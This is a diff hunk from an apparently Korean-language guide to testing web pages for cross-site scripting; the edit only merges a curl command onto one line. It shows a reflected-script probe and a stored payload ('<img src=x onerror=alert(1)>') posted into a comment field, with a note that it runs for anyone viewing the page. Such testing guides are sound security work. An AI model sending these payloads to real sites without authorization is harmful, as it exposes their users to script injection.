@@ -31,8 +31,7 @@ curl -s "http://target.com/search?q=%3Cscript%3E" | grep -i script
 
 ```bash
 # 댓글·프로필 등 저장되는 필드에 페이로드 삽입
-curl -X POST http://target.com/comment \
-  -d "comment=<img src=x onerror=alert(1)>&post_id=1"
+curl -X POST http://target.com/comment -d "comment=<img src=x onerror=alert(1)>&post_id=1"
 ```
 
 - 저장형 판정: 삽입 후 페이지(또는 다른 사용자가 보는 페이지)를 다시 열 때마다 실행된다. 댓글 목록·관리자 대시보드 같은 "다른 사람이 보는 화면"이 실행 지점이 된다.
